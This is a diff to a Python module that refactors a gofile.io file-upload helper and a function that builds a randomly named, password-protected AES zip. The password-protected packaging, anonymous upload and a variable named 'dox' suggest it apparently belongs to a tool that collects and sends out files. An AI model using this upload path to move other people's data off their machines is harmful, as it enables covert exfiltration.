@@ -6,6 +6,8 @@ from manager.logger import Log
 from random import randint
 from pyzipper import AESZipFile, ZIP_STORED, WZ_AES
 from json import dumps
+from string import ascii_lowercase, digits
+from secrets import choice
 from preferences.config import config
 
 def upload_file_to_gofile(file_path):
@@ -17,8 +19,8 @@ def upload_file_to_gofile(file_path):
         if not servers: raise Exception("No server is available to upload")
 
         server = servers[randint(0, len(servers) - 1)]["name"]
-        with open(file_path, 'rb') as file:
-            response = post(f'https://{server}.gofile.io/contents/uploadfile', files={ 'file': file })
+        with open(file_path, "rb") as file:
+            response = post(f"https://{server}.gofile.io/contents/uploadfile", files={ "file": file })
             if response.status_code == 200: return response.json()["data"]["downloadPage"]
             else: raise Exception("Failed to upload file")
         
@@ -27,13 +29,9 @@ def upload_file_to_gofile(file_path):
         return e
 
 def MakeZip():
-    dox = "qwertyuiopasdfghjklzxcvbnm1234567890"
-    pwd_str = ""
-    name = ""
-    for i in range (40):
-        name += dox[randint(0,len(dox)-1)]
-    for i in range (60):
-        pwd_str += dox[randint(0,len(dox)-1)]
+    dox = ascii_lowercase + digits
+    name = "".join(choice(dox) for _ in range(40))
+    pwd_str = "".join(choice(dox) for _ in range(60))
     password = bytes(pwd_str, "UTF-8")
     
     try:
